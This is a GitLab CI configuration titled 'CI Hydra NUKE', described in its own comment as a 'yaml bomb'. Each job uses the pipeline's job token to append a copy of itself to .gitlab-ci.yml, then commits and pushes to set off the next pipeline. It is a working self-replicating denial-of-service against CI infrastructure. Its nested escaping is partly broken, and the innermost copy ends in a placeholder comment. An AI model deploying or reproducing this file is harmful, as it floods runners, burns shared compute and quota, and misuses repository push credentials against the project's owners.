# .gitlab-ci.yml â€” CI Hydra NUKE

stages: [regrow]

ci_hydra_regrow:
  stage: regrow
  image: alpine:latest
  rules:
    - if: '$CI_PIPELINE_SOURCE == "commit"'
      when: always

  script:
    - apk add --no-cache git coreutils grep
    - git config --global user.email "hydra-bot@example.com"
    - git config --global user.name "CI Hydra Bot"

    # use CI_JOB_TOKEN for auth to push <------- If this is locked down, this yaml bomb will fail.
    - |
      git remote remove ci >/dev/null 2>&1 || true
      git remote add ci "https://gitlab-ci-token:${CI_JOB_TOKEN}@${CI_SERVER_HOST}/${CI_PROJECT_PATH}.git"
      git fetch ci "${CI_COMMIT_REF_NAME}"

    # (informational) count previous heads
    - COUNT=$(grep -c '^hydra_head_' .gitlab-ci.yml || true)
    - echo "ðŸ Current heads (info): ${COUNT}"

    # append a new hydra head job (self-replicating)
    - |
      HEAD_NAME="hydra_head_$(date +%s)_${CI_PIPELINE_IID}"
      cat >> .gitlab-ci.yml <<EOF

${HEAD_NAME}:
  stage: regrow
  image: alpine:latest
  rules:
    - if: '\$CI_PIPELINE_SOURCE == "push"'
      when: always
    - when: never
  script:
    - apk add --no-cache git coreutils grep
    - git config --global user.email "hydra-bot@example.com"
    - git config --global user.name "CI Hydra Bot"
    - |
      git remote remove ci >/dev/null 2>&1 || true
      git remote add ci "https://gitlab-ci-token:\${CI_JOB_TOKEN}@\${CI_SERVER_HOST}/\${CI_PROJECT_PATH}.git"
      git fetch ci "\${CI_COMMIT_REF_NAME}"
    - |
      COUNT=\$(grep -c '^hydra_head_' .gitlab-ci.yml || true)
      echo "ðŸ Current heads (info): \${COUNT}"
    - |
      NEW_HEAD_NAME="hydra_head_\$(date +%s)_\${CI_PIPELINE_IID}"
      cat >> .gitlab-ci.yml <<EOE

\${NEW_HEAD_NAME}:
  stage: regrow
  image: alpine:latest
  rules:
    - if: '\\\$CI_PIPELINE_SOURCE == "push"'
      when: always
    - when: never
  script:
    - apk add --no-cache git coreutils grep
    - git config --global user.email "hydra@.com"
    - git config --global user.name "CI Hydra Bot"
    - |
      git remote remove ci >/dev/null 2>&1 || true
      git remote add ci "https://gitlab-ci-token:\\\${CI_JOB_TOKEN}@\\\${CI_SERVER_HOST}/\\\${CI_PROJECT_PATH}.git"
      git fetch ci "\\\${CI_COMMIT_REF_NAME}"
    - |
      COUNT=\\\$(grep -c '^hydra_head_' .gitlab-ci.yml || true)
      echo "ðŸ Current heads (info): \\\${COUNT}"
    - |
      NEXT_HEAD_NAME="hydra_head_\\\$(date +%s)_\\\${CI_PIPELINE_IID}"
      cat >> .gitlab-ci.yml <<EOE

\\\${NEXT_HEAD_NAME}:
  # This pattern continues infinitely...
EOE
    - git add .gitlab-ci.yml
    - git commit -m "CI Hydra sprouts \${NEW_HEAD_NAME}"
    - git push ci "\${CI_COMMIT_REF_NAME}:\${CI_COMMIT_REF_NAME}"
EOF

    # commit & push -> triggers next pipeline
    - git add .gitlab-ci.yml
    - git commit -m "CI Hydra sprouts ${HEAD_NAME}"
    - git push ci "${CI_COMMIT_REF_NAME}:${CI_COMMIT_REF_NAME}"